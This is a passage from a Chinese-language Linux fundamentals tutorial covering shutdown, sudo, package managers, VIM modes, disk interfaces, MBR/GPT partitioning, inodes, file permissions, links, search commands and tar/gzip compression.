<p>info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。</p>
<h3 id="_4-doc" tabindex="-1"> 4. doc</h3>
<p>/usr/share/doc 存放着软件的一整套说明文件。</p>
<h2 id="关机" tabindex="-1"> 关机</h2>
<h3 id="_1-who" tabindex="-1"> 1. who</h3>
<p>在关机前需要先使用 who 命令查看有没有其它用户在线。</p>
<h3 id="_2-sync" tabindex="-1"> 2. sync</h3>
<p>为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。</p>
<h3 id="_3-shutdown" tabindex="-1"> 3. shutdown</h3>
<div><pre><code># shutdown [-krhc] 时间 [信息]
-k ： 不会关机，只是发送警告信息，通知所有在线的用户
-r ： 将系统的服务停掉后就重新启动
-h ： 将系统的服务停掉后就立即关机
-c ： 取消已经在进行的 shutdown 指令内容
</code></pre></div><h2 id="path" tabindex="-1"> PATH</h2>
<p>可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。</p>
<div><pre><code>/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin
</code></pre></div><h2 id="sudo" tabindex="-1"> sudo</h2>
<p>sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。</p>
<h2 id="包管理工具" tabindex="-1"> 包管理工具</h2>
<p>RPM 和 DPKG 为最常见的两类软件包管理工具：</p>
<ul>
<li>RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为许多 Linux 系统的既定软件标准。YUM 基于 RPM，具有依赖管理和软件升级功能。</li>
<li>与 RPM 竞争的是基于 Debian 操作系统的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。</li>
</ul>
<h2 id="发行版" tabindex="-1"> 发行版</h2>
<p>Linux 发行版是 Linux 内核及各种应用软件的集成版本。</p>
<table>
<thead>
<tr>
<th style="text-align:center">基于的包管理工具</th>
<th style="text-align:center">商业发行版</th>
<th style="text-align:center">社区发行版</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">RPM</td>
<td style="text-align:center">Red Hat</td>
<td style="text-align:center">Fedora / CentOS</td>
</tr>
<tr>
<td style="text-align:center">DPKG</td>
<td style="text-align:center">Ubuntu</td>
<td style="text-align:center">Debian</td>
</tr>
</tbody>
</table>
<h2 id="vim-三个模式" tabindex="-1"> VIM 三个模式</h2>
<ul>
<li>一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容；</li>
<li>编辑模式（Insert mode）：按下 &quot;i&quot; 等按键之后进入，可以对文本进行编辑；</li>
<li>指令列模式（Bottom-line mode）：按下 &quot;:&quot; 按键之后进入，用于保存退出等操作。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b5e9fa4d-78d3-4176-8273-756d970742c7.png" width="500"/> </div><br>
<p>在指令列模式下，有以下命令用于离开或者保存文件。</p>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">:w</td>
<td style="text-align:center">写入磁盘</td>
</tr>
<tr>
<td style="text-align:center">:w!</td>
<td style="text-align:center">当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关</td>
</tr>
<tr>
<td style="text-align:center">:q</td>
<td style="text-align:center">离开</td>
</tr>
<tr>
<td style="text-align:center">:q!</td>
<td style="text-align:center">强制离开不保存</td>
</tr>
<tr>
<td style="text-align:center">:wq</td>
<td style="text-align:center">写入磁盘后离开</td>
</tr>
<tr>
<td style="text-align:center">:wq!</td>
<td style="text-align:center">强制写入磁盘后离开</td>
</tr>
</tbody>
</table>
<h2 id="gnu" tabindex="-1"> GNU</h2>
<p>GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议（GNU General Public License），包含了以下内容：</p>
<ul>
<li>以任何目的运行此程序的自由；</li>
<li>再复制的自由；</li>
<li>改进此程序，并公开发布改进的自由。</li>
</ul>
<h2 id="开源协议" tabindex="-1"> 开源协议</h2>
<ul>
<li><a href="https://choosealicense.com/" target="_blank" rel="noopener noreferrer">Choose an open source license</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" target="_blank" rel="noopener noreferrer">如何选择开源许可证？</a></li>
</ul>
<h1 id="二、磁盘" tabindex="-1"> 二、磁盘</h1>
<h2 id="磁盘接口" tabindex="-1"> 磁盘接口</h2>
<h3 id="_1-ide" tabindex="-1"> 1. IDE</h3>
<p>IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/924914c0-660c-4e4a-bbc0-1df1146e7516.jpg" width="400"/> </div><br>
<h3 id="_2-sata" tabindex="-1"> 2. SATA</h3>
<p>SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MiB/s，而 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9f2a16b-4843-44d1-9759-c745772e9bcf.jpg" width=""/> </div><br>
<h3 id="_3-scsi" tabindex="-1"> 3. SCSI</h3>
<p>SCSI 全称是 Small Computer System Interface（小型机系统接口），SCSI 硬盘广为工作站以及个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f0574025-c514-49f5-a591-6d6a71f271f7.jpg" width=""/> </div><br>
<h3 id="_4-sas" tabindex="-1"> 4. SAS</h3>
<p>SAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也通过缩小连接线改善系统内部空间等。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6729baa0-57d7-4817-b3aa-518cbccf824c.jpg" width=""/> </div><br>
<h2 id="磁盘的文件名" tabindex="-1"> 磁盘的文件名</h2>
<p>Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：</p>
<ul>
<li>IDE 磁盘：/dev/hd[a-d]</li>
<li>SATA/SCSI/SAS 磁盘：/dev/sd[a-p]</li>
</ul>
<p>其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。</p>
<h1 id="三、分区" tabindex="-1"> 三、分区</h1>
<h2 id="分区表" tabindex="-1"> 分区表</h2>
<p>磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。</p>
<h3 id="_1-mbr" tabindex="-1"> 1. MBR</h3>
<p>MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。</p>
<p>分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区来记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。</p>
<p>Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。</p>
<h3 id="_2-gpt" tabindex="-1"> 2. GPT</h3>
<p>扇区是磁盘的最小存储单位，旧磁盘的扇区大小通常为 512 bytes，而最新的磁盘支持 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。</p>
<p>GPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。</p>
<p>GPT 没有扩展分区概念，都是主分区，每个 LBA 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。</p>
<p>MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 2<sup>33</sup> TB = 8 ZB。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/GUID_Partition_Table_Scheme.svg.png" width="400"/> </div><br>
<h2 id="开机检测程序" tabindex="-1"> 开机检测程序</h2>
<h3 id="_1-bios" tabindex="-1"> 1. BIOS</h3>
<p>BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/50831a6f-2777-46ea-a571-29f23c85cc21.jpg"/> </div><br>
<p>BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。</p>
<p>主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。</p>
<p>下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f900f266-a323-42b2-bc43-218fdb8811a8.jpg" width="600"/> </div><br>
<p>安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。</p>
<h3 id="_2-uefi" tabindex="-1"> 2. UEFI</h3>
<p>BIOS 不可以读取 GPT 分区表，而 UEFI 可以。</p>
<h1 id="四、文件系统" tabindex="-1"> 四、文件系统</h1>
<h2 id="分区与文件系统" tabindex="-1"> 分区与文件系统</h2>
<p>对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。</p>
<h2 id="组成" tabindex="-1"> 组成</h2>
<p>最主要的几个组成部分如下：</p>
<ul>
<li>inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号；</li>
<li>block：记录文件的内容，文件太大时，会占用多个 block。</li>
</ul>
<p>除此之外还包括：</p>
<ul>
<li>superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等；</li>
<li>block bitmap：记录 block 是否被使用的位图。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/BSD_disk.png" width="800"/> </div><br>
<h2 id="文件读取" tabindex="-1"> 文件读取</h2>
<p>对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中查找文件内容所在的所有 block，然后把所有 block 的内容读出来。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/12a65cc6-20e0-4706-9fe6-3ba49413d7f6.png" width="500px"> </div><br>
<p>而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5b718e86-7102-4bb6-8ca5-d1dd791530c5.png" width="500px"> </div><br>
<h2 id="磁盘碎片" tabindex="-1"> 磁盘碎片</h2>
<p>指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。</p>
<h2 id="block" tabindex="-1"> block</h2>
<p>在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。</p>
<table>
<thead>
<tr>
<th style="text-align:center">大小</th>
<th style="text-align:center">1KB</th>
<th style="text-align:center">2KB</th>
<th style="text-align:center">4KB</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">最大单一文件</td>
<td style="text-align:center">16GB</td>
<td style="text-align:center">256GB</td>
<td style="text-align:center">2TB</td>
</tr>
<tr>
<td style="text-align:center">最大文件系统</td>
<td style="text-align:center">2TB</td>
<td style="text-align:center">8TB</td>
<td style="text-align:center">16TB</td>
</tr>
</tbody>
</table>
<p>一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。</p>
<h2 id="inode" tabindex="-1"> inode</h2>
<p>inode 具体包含以下信息：</p>
<ul>
<li>权限 (read/write/excute)；</li>
<li>拥有者与群组 (owner/group)；</li>
<li>容量；</li>
<li>建立或状态改变的时间 (ctime)；</li>
<li>最近读取时间 (atime)；</li>
<li>最近修改时间 (mtime)；</li>
<li>定义文件特性的旗标 (flag)，如 SetUID...；</li>
<li>该文件真正内容的指向 (pointer)。</li>
</ul>
<p>inode 具有以下特点：</p>
<ul>
<li>每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)；</li>
<li>每个文件都仅会占用一个 inode。</li>
</ul>
<p>inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用让 inode 记录的引用 block 块记录引用信息。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/inode_with_signatures.jpg" width="600"/> </div><br>
<h2 id="目录" tabindex="-1"> 目录</h2>
<p>建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。</p>
<p>可以看到文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的写权限有关。</p>
<h2 id="日志" tabindex="-1"> 日志</h2>
<p>如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。</p>
<p>ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。</p>
<h2 id="挂载" tabindex="-1"> 挂载</h2>
<p>挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。</p>
<h2 id="目录配置" tabindex="-1"> 目录配置</h2>
<p>为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：</p>
<ul>
<li>/ (root, 根目录)</li>
<li>/usr (unix software resource)：所有系统默认软件都会安装到这个目录；</li>
<li>/var (variable)：存放系统或程序运行过程中的数据文件。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/linux-filesystem.png" width=""/> </div><br>
<h1 id="五、文件" tabindex="-1"> 五、文件</h1>
<h2 id="文件属性" tabindex="-1"> 文件属性</h2>
<p>用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。</p>
<p>使用 ls 查看一个文件时，会显示一个文件的信息，例如 <code>drwxr-xr-x 3 root root 17 May 6 00:14 .config</code>，对这个信息的解释如下：</p>
<ul>
<li>drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段</li>
<li>3：链接数</li>
<li>root：文件拥有者</li>
<li>root：所属群组</li>
<li>17：文件大小</li>
<li>May 6 00:14：文件最后被修改的时间</li>
<li>.config：文件名</li>
</ul>
<p>常见的文件类型及其含义有：</p>
<ul>
<li>d：目录</li>
<li>-：文件</li>
<li>l：链接文件</li>
</ul>
<p>9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。</p>
<p>文件时间有以下三种：</p>
<ul>
<li>modification time (mtime)：文件的内容更新就会更新；</li>
<li>status time (ctime)：文件的状态（权限、属性）更新就会更新；</li>
<li>access time (atime)：读取文件时就会更新。</li>
</ul>
<h2 id="文件与目录的基本操作" tabindex="-1"> 文件与目录的基本操作</h2>
<h3 id="_1-ls" tabindex="-1"> 1. ls</h3>
<p>列出文件或者目录的信息，目录的信息就是其中包含的文件。</p>
<div><pre><code># ls [-aAdfFhilnrRSt] file|dir
-a ：列出全部的文件
-d ：仅列出目录本身
-l ：以长数据串行列出，包含文件的属性与权限等等数据
</code></pre></div><h3 id="_2-cd" tabindex="-1"> 2. cd</h3>
<p>更换当前目录。</p>
<div><pre><code>cd [相对路径或绝对路径]
</code></pre></div><h3 id="_3-mkdir" tabindex="-1"> 3. mkdir</h3>
<p>创建目录。</p>
<div><pre><code># mkdir [-mp] 目录名称
-m ：配置目录权限
-p ：递归创建目录
</code></pre></div><h3 id="_4-rmdir" tabindex="-1"> 4. rmdir</h3>
<p>删除目录，目录必须为空。</p>
<div><pre><code>rmdir [-p] 目录名称
-p ：递归删除目录
</code></pre></div><h3 id="_5-touch" tabindex="-1"> 5. touch</h3>
<p>更新文件时间或者建立新文件。</p>
<div><pre><code># touch [-acdmt] filename
-a ： 更新 atime
-c ： 更新 ctime，若该文件不存在则不建立新文件
-m ： 更新 mtime
-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date="日期或时间"
-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm]
</code></pre></div><h3 id="_6-cp" tabindex="-1"> 6. cp</h3>
<p>复制文件。如果源文件有两个以上，则目的文件一定要是目录才行。</p>
<div><pre><code>cp [-adfilprsu] source destination
-a ：相当于 -dr --preserve=all
-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身
-i ：若目标文件已经存在时，在覆盖前会先询问
-p ：连同文件的属性一起复制过去
-r ：递归复制
-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制
--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了
</code></pre></div><h3 id="_7-rm" tabindex="-1"> 7. rm</h3>
<p>删除文件。</p>
<div><pre><code># rm [-fir] 文件或目录
-r ：递归删除
</code></pre></div><h3 id="_8-mv" tabindex="-1"> 8. mv</h3>
<p>移动文件。</p>
<div><pre><code># mv [-fiu] source destination
# mv [options] source1 source2 source3 .... directory
-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖
</code></pre></div><h2 id="修改权限" tabindex="-1"> 修改权限</h2>
<p>可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。</p>
<div><pre><code># chmod [-R] xyz dirname/filename
</code></pre></div><p>示例：将 .bashrc 文件的权限修改为 -rwxr-xr--。</p>
<div><pre><code># chmod 754 .bashrc
</code></pre></div><p>也可以使用符号来设定权限。</p>
<div><pre><code># chmod [ugoa]  [+-=] [rwx] dirname/filename
- u：拥有者
- g：所属群组
- o：其他人
- a：所有人
- +：添加权限
- -：移除权限
- =：设定权限
</code></pre></div><p>示例：为 .bashrc 文件的所有用户添加写权限。</p>
<div><pre><code># chmod a+w .bashrc
</code></pre></div><h2 id="默认权限" tabindex="-1"> 默认权限</h2>
<ul>
<li>文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。</li>
<li>目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。</li>
</ul>
<p>可以通过 umask 设置或者查看默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r--。</p>
<h2 id="目录的权限" tabindex="-1"> 目录的权限</h2>
<p>文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。</p>
<p>目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。</p>
<h2 id="链接" tabindex="-1"> 链接</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e46fd03-0cda-4d60-9b1c-0c256edaf6b2.png" width="450px"> </div><br>
<div><pre><code># ln [-sf] source_filename dist_filename
-s ：默认是实体链接，加 -s 为符号链接
-f ：如果目标文件存在时，先删除目标文件
</code></pre></div><h3 id="_1-实体链接" tabindex="-1"> 1. 实体链接</h3>
<p>在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。</p>
<p>删除任意一个条目，文件还是存在，只要引用数量不为 0。</p>
<p>有以下限制：不能跨越文件系统、不能对目录进行链接。</p>
<div><pre><code># ln /etc/crontab .
# ll -i /etc/crontab crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
</code></pre></div><h3 id="_2-符号链接" tabindex="-1"> 2. 符号链接</h3>
<p>符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。</p>
<p>当源文件被删除了，链接文件就打不开了。</p>
<p>因为记录的是路径，所以可以为目录建立符号链接。</p>
<div><pre><code># ll -i /etc/crontab /root/crontab2
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -> /etc/crontab
</code></pre></div><h2 id="获取文件内容" tabindex="-1"> 获取文件内容</h2>
<h3 id="_1-cat" tabindex="-1"> 1. cat</h3>
<p>取得文件内容。</p>
<div><pre><code># cat [-AbEnTv] filename
-n ：打印出行号，连同空白行也会有行号，-b 不会
</code></pre></div><h3 id="_2-tac" tabindex="-1"> 2. tac</h3>
<p>是 cat 的反向操作，从最后一行开始打印。</p>
<h3 id="_3-more" tabindex="-1"> 3. more</h3>
<p>和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。</p>
<h3 id="_4-less" tabindex="-1"> 4. less</h3>
<p>和 more 类似，但是多了一个向前翻页的功能。</p>
<h3 id="_5-head" tabindex="-1"> 5. head</h3>
<p>取得文件前几行。</p>
<div><pre><code># head [-n number] filename
-n ：后面接数字，代表显示几行的意思
</code></pre></div><h3 id="_6-tail" tabindex="-1"> 6. tail</h3>
<p>是 head 的反向操作，只是取得是后几行。</p>
<h3 id="_7-od" tabindex="-1"> 7. od</h3>
<p>以字符或者十六进制的形式显示二进制文件。</p>
<h2 id="指令与文件搜索" tabindex="-1"> 指令与文件搜索</h2>
<h3 id="_1-which" tabindex="-1"> 1. which</h3>
<p>指令搜索。</p>
<div><pre><code># which [-a] command
-a ：将所有指令列出，而不是只列第一个
</code></pre></div><h3 id="_2-whereis" tabindex="-1"> 2. whereis</h3>
<p>文件搜索。速度比较快，因为它只搜索几个特定的目录。</p>
<div><pre><code># whereis [-bmsu] dirname/filename
</code></pre></div><h3 id="_3-locate" tabindex="-1"> 3. locate</h3>
<p>文件搜索。可以用关键字或者正则表达式进行搜索。</p>
<p>locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。</p>
<div><pre><code># locate [-ir] keyword
-r：正则表达式
</code></pre></div><h3 id="_4-find" tabindex="-1"> 4. find</h3>
<p>文件搜索。可以使用文件的属性和权限进行搜索。</p>
<div><pre><code># find [basedir] [option]
example: find . -name "shadow*"
</code></pre></div><p><strong>① 与时间有关的选项</strong></p>
<div><pre><code>-mtime  n ：列出在 n 天前的那一天修改过内容的文件
-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件
-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件
-newer file ： 列出比 file 更新的文件
</code></pre></div><p>+4、4 和 -4 的指示的时间范围如下：</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/658fc5e7-79c0-4247-9445-d69bf194c539.png" width=""/> </div><br>
<p><strong>② 与文件拥有者和所属群组有关的选项</strong></p>
<div><pre><code>-uid n
-gid n
-user name
-group name
-nouser ：搜索拥有者不存在 /etc/passwd 的文件
-nogroup：搜索所属群组不存在于 /etc/group 的文件
</code></pre></div><p><strong>③ 与文件权限和名称有关的选项</strong></p>
<div><pre><code>-name filename
-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k
-type TYPE
-perm mode  ：搜索权限等于 mode 的文件
-perm -mode ：搜索权限包含 mode 的文件
-perm /mode ：搜索权限包含任一 mode 的文件
</code></pre></div><h1 id="六、压缩与打包" tabindex="-1"> 六、压缩与打包</h1>
<h2 id="压缩文件名" tabindex="-1"> 压缩文件名</h2>
<p>Linux 底下有很多压缩文件名，常见的如下：</p>
<table>
<thead>
<tr>
<th>扩展名</th>
<th>压缩程序</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.Z</td>
<td>compress</td>
</tr>
<tr>
<td>*.zip</td>
<td>zip</td>
</tr>
<tr>
<td>*.gz</td>
<td>gzip</td>
</tr>
<tr>
<td>*.bz2</td>
<td>bzip2</td>
</tr>
<tr>
<td>*.xz</td>
<td>xz</td>
</tr>
<tr>
<td>*.tar</td>
<td>tar 程序打包的数据，没有经过压缩</td>
</tr>
<tr>
<td>*.tar.gz</td>
<td>tar 程序打包的文件，经过 gzip 的压缩</td>
</tr>
<tr>
<td>*.tar.bz2</td>
<td>tar 程序打包的文件，经过 bzip2 的压缩</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td>tar 程序打包的文件，经过 xz 的压缩</td>
</tr>
</tbody>
</table>
<h2 id="压缩指令" tabindex="-1"> 压缩指令</h2>
<h3 id="_1-gzip" tabindex="-1"> 1. gzip</h3>
<p>gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。</p>
<p>经过 gzip 压缩过，源文件就不存在了。</p>
<p>有 9 个不同的压缩等级可以使用。</p>
<p>可以使用 zcat、zmore、zless 来读取压缩文件的内容。</p>
<div><pre><code>$ gzip [-cdtv#] filename
-c ：将压缩的数据输出到屏幕上
-d ：解压缩
-t ：检验压缩文件是否出错
-v ：显示压缩比等信息
-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6
</code></pre></div><h3 id="_2-bzip2" tabindex="-1"> 2. bzip2</h3>
<p>提供比 gzip 更高的压缩比。</p>
<p>查看命令：bzcat、bzmore、bzless、bzgrep。</p>
<div><pre><code>$ bzip2 [-cdkzv#] filename
-k ：保留源文件
</code></pre></div><h3 id="_3-xz" tabindex="-1"> 3. xz</h3>
<p>提供比 bzip2 更佳的压缩比。</p>
<p>可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。</p>
<p>查看命令：xzcat、xzmore、xzless、xzgrep。</p>
<div><pre><code>$ xz [-dtlkc#] filename
</code></pre></div><h2 id="打包" tabindex="-1"> 打包</h2>
<p>压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gzip、bzip2、xz 将打包文件进行压缩。</p>
<div><pre><code>$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename...  ==打包压缩
$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件]              ==查看
$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录]    ==解压缩
-z ：使用 zip；
-j ：使用 bzip2；
-J ：使用 xz；
-c ：新建打包文件；
-t ：查看打包文件里面有哪些文件；
-x ：解打包或解压缩的功能；
-v ：在压缩/解压缩的过程中，显示正在处理的文件名；
-f : filename：要处理的文件；
-C 目录 ： 在特定目录解压缩。
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><table>
<thead>
<tr>
<th style="text-align:center">使用方式</th>
<th>命令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">打包压缩</td>
<td>tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称</td>
</tr>
<tr>
<td style="text-align:center">查 看</td>
<td>tar -jtv -f filename.tar.bz2</td>
</tr>
<tr>
<td style="text-align:center">解压缩</td>
<td>tar -jxv -f filename.tar.bz2 -C 要解压缩的目录</td>
</tr>
</tbody>
</table>
<h1 id="七、bash" tabindex="-1"> 七、Bash</h1>
<p>可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。</p>
<h2 id="特性" tabindex="-1"> 特性</h2>
<ul>
<li>命令历史：记录使用过的命令</li>
